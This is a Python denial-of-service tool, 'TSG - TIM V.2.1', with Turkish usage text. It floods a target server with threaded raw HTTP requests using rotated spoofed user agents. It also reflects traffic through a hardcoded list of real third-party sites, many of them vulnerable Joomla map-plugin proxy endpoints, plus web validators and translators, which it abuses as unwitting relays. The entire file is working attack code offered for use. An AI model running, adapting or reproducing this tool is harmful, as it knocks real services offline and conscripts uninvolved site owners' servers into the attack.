#!/usr/bin/python3
# -*- coding: utf-8 -*-

#                     * TSG - TIM V.2.1 *
# Python TürkSiberGüvenlik DoS Script V.2.1 {TSG - TIM | EDITION!}
# EffoNeriX Tarafindan Gelistirilmistir!
# Forum: http://www.turksiberguvenlik.net/
# YouTube: https://www.youtube.com/channel/UC69aazgn3x-975Z5UasYBSQ

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def u_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
	uagent.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
	uagent.append("Opera/9.20 (Windows NT 6.0; U; en)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)")
	uagent.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)") #Test
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13")
	uagent.append("Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7")
	uagent.append("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://www.cbpp.org/cms/sites/all/modules/ckeditor_link/proxy.php?url=")
	bots.append("http://www.daimi.au.dk/CPnets/proxy.php?url=")
	bots.append("http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=")
	bots.append("http://dev.jaycom.se/undertexter/proxy.php?url=")
	bots.append("http://soroka-vorovka.com/proxy/proxy.php?url=")
	bots.append("http://www.gvpl.ca/url/proxy.php?url=")
	bots.append("http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=")
	bots.append("http://www.google.com/ig/add?feedurl=")
	bots.append("http://anonymouse.org/cgi-bin/anon-www.cgi/")
	bots.append("http://www.google.com/translate?u=")
	bots.append("http://translate.google.com/translate?u=")
	bots.append("http://validator.w3.org/feed/check.cgi?url=")
	bots.append("http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=")
	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
	bots.append("http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=")
	bots.append("http://www.w3.org/RDF/Validator/ARPServlet?URI=")
	bots.append("http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=")
	bots.append("http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=")
	bots.append("http://www.w3.org/services/tidy?docAddr=")
	bots.append("http://validator.w3.org/mobile/check?docAddr=")
	bots.append("http://validator.w3.org/p3p/20020128/p3p.pl?uri=")
	bots.append("http://validator.w3.org/p3p/20020128/policy.pl?uri=")
	bots.append("http://online.htmlvalidator.com/php/onlinevallite.php?url=")
	bots.append("http://feedvalidator.org/check.cgi?url=")
	bots.append("http://gmodules.com/ig/creator?url=")
	bots.append("http://www.google.com/ig/adde?moduleurl=")
	bots.append("http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=")
	bots.append("http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=")
	bots.append("http://host-tracker.com/check_page/?furl=")
	bots.append("http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=")
	bots.append("http://www.onlinewebcheck.com/check.php?url=")
	bots.append("http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=")
	bots.append("http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=")
	bots.append("http://streamitwebseries.twww.tv/proxy.php?url=")
	bots.append("http://www.comicgeekspeak.com/proxy.php?url=")
	bots.append("http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://web-sniffer.net/?url=")
	bots.append("http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=")
	bots.append("http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=")
	bots.append("http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=")
	bots.append("http://translate.yandex.net/tr-url/ru-uk.uk/")
	bots.append("http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=")
	bots.append("http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS")
	bots.append("http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=")
	bots.append("http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=")
	bots.append("http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=")
	bots.append("http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=")
	bots.append("http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=")
	bots.append("http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=")
	bots.append("http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=")
	bots.append("http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.taggroup.com.au/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.ascotbudgetinn.net.au/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	bots.append("http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=")
	bots.append("http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=")
	return(bots)


def attack(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94m* \033[91m!Cökertiliyor! \033[94m*\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[94m* \033[91m!Saldiri Baslatildi! \033[94m* \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mShutdown!\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[94m* \033[91mBaglanti Yok! Server Cökmüs Olabilir. \033[94m*\033[0m")

		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		attack(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[91m

                                           `.-----::-----.`                                          
                                     `-:::-.`...-::-.....-:::-`                                     
                                  .:::..:oosyhhdddddhhhyyso:..:::.                                  
                               `:/--:syso//+oooosddddmmmmmmmdyo:-::-`                               
                             `::-:oymNo//:oydmmmdmddhdhddddhdddhs+--::`                             
                            -:--ohdmdd/-/ydmhhdmmdhhhhs+hyoyhhhhhhh+--:-                            
                           :.`:yddmdy+-:ohdddddhddyoyhs-::+hhhhhhhhhy:`.-                           
                         `-`.+hddddd+---oyyhs://:-.-++::--:shhhhdhhyyy+.`:`                         
                        `-``sdhddddds/:-ohhhsoo+/-``-sho-sssyhhhyyyhdddo``-                         
                        -..odhhdhhhhy::::hdhhhhhys.  yhyshddhyyyyhddddhdo..-                        
```  ```..-------...```````.-..----::-:::/hhhyhhso:  hdhhhhs//::-----....```````...-------..```   ``
 `.````..--::::::--..```:-.```   ```..:/::++yhhy//-.`yhhhyy+/:..```   ```.-:```..--::::::--..`````` 
   ``-...--::::::--..```-:-..`` `````.-:///::++:--.--/yyys+/:-.````` ``..-:-```..--::::::--....``   
      ```-:::::::--...``-:-.``` `````.--://::.``````..-:://:--.````` ```.-:-``...--:::::::-```      
         ```.:/::----....:::-`.`````..--:/+-`    `     `-+/:--..`````.`-:::....----::/:.```         
             `````--.-::-.:/::..`.``..--::/-`.-.--```.-`-/::--..``.`..::/:.-::..--`````             
                    `.----..///-..-`.--:://+/:-.:+:-.-/////::--.`-..:///..--::-.`                   
                      `-.-::.-////-/:-+:-::.yh:`-+/..:hy.::-:+-:/-////-.::-.:-..                    
                        ./+os+::o+ossy/+.`o.+m+-.``.-/m+.o`.+/ysso+o::+so+/-                        
                        `:yhhddd+oys/o/.::o///:.```..:///o:/./+/ss++ddhhhy:`                        
                         .:////////+/o/o+ssss/y:s+ss+o++oso/oo+-:/:://///-.                         
                         `----+sshsdoh+yossso/o:+://:+/+oss+sho:shy+s+----`                         
                        `.----:+:+/+//////++/.--....:-./++///////++:o:----.`                        
                     `...--:+osyyyyhmNMMM-omms::..``-:ommy/MMMNmhyyyyso/:--..-                      
                       ..-::::-+/++/+sdNM:.-:++:--`.`---:/+MNds+/++/+:::::-..                       
                       ```      `-://+//oho/++++:-..-`.:/sdo:/+//:-`      ```                       
                                   `.-://oyo++oo-```+:.:oyo//:-.`                                   
                                       `...-:://.```./-:-...`                                       
                                               .-``-.                                               
                                                 --                                                 
                                                 ``                                  
									   
	              \033[94m* \033[91mTSG - TIM EDITION \033[96mV.2.1 \033[94m*\033[91m
	\033[94m@---------------------------------------------------@
	\033[91mForum: http://www.turksiberguvenlik.com/\033[0m
	\033[91mYouTube: https://www.youtube.com/channel/UC69aazgn3x-975Z5UasYBSQ\033[0m
	\033[93mGelismis DoS Script, By EffoNeriX.
	\033[92mYetkilendirmeyi Unutmayiniz:\033[91m "chmod +x tsg.py"
	\033[94mServer uzerinden Saldiri Yapiniz, Daha Etkili Olur.\033[91m \n\033[94m	@---------------------------------------------------@\n\033[91m
	\033[94mKullanim: \033[91mpython3 tsg.py -s (server ip) -p (port) -t (turbo)\n
	-h \033[94m* \033[91mYardim
	-s \033[94m* \033[91mServer IP
	-p \033[94m* \033[91mPort, Varsayilan 80
	-t \033[94m* \033[91mTurbo, Varsayilan 200 \n	\n	Ex: python3 tsg.py -s 127.0.0.1 -p 80 -t 200\n 	\033[94m@---------------------------------------------------@\033[0m''')
	sys.exit()


def parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Attacks")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="server ip'sine saldir -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 varsayilan 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="varsayilan 200 -t 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="yardim")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 200
	else:
		thr = opts.turbo



global data
headers = open("script.txt", "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	parameters()
	print("	\033[94m@--------------- \033[91m* TSG - TIM \033[96mV.2.1 \033[91m*\033[94m ---------------@\033[0m\n")
	print("	\033[94m* \033[93mServer:\033[96m",host," \n	\033[94m* \033[93mPort:\033[96m",str(port),"\n	\033[94m* \033[93mTurbo:\033[96m",str(thr),"\033[0m")
	print("	\033[94m* \033[91mSaldiri Baslatiliyor...\033[0m\n")
	print("	\033[94m@---------------------------------------------------@\033[0m\n")
	u_agent()
	bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m* Server IP ve Port'u Kontrol Ediniz! *\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True
			t2.start()
		start = time.time()
		
		item = 0
		while True:
			if (item>1800):
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
